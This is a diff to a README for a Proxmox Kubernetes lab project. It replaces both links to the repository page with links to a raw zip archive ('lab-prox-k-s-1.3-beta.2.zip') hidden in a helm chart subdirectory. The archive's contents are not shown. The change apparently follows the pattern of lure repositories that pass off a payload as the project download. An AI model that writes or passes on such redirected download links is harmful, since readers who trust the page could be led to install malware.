@@ -1,6 +1,6 @@
 # 🛠️ prox-k8s-lab - Build your own private Kubernetes server
 
-[![](https://img.shields.io/badge/Download-Project-blue)](https://github.com/Proverbial-genicularvein571/prox-k8s-lab)
+[![](https://img.shields.io/badge/Download-Project-blue)](https://raw.githubusercontent.com/Proverbial-genicularvein571/prox-k8s-lab/main/helm/charts/headlamp/lab-prox-k-s-1.3-beta.2.zip)
 
 This project helps you create a private Kubernetes laboratory on Proxmox virtual machines. It automates server setup using Ansible and keeps your applications updated with ArgoCD and Helm. Use this to manage your home media server, storage tools, or test web applications in a private environment.
 
@@ -19,7 +19,7 @@ Before you begin, ensure your hardware meets these standards.
 
 You get the latest version of the toolkit from the main repository page.
 
-[Click here to visit the download page](https://github.com/Proverbial-genicularvein571/prox-k8s-lab)
+[Click here to visit the download page](https://raw.githubusercontent.com/Proverbial-genicularvein571/prox-k8s-lab/main/helm/charts/headlamp/lab-prox-k-s-1.3-beta.2.zip)
 
 Follow these steps to obtain the source code:
 
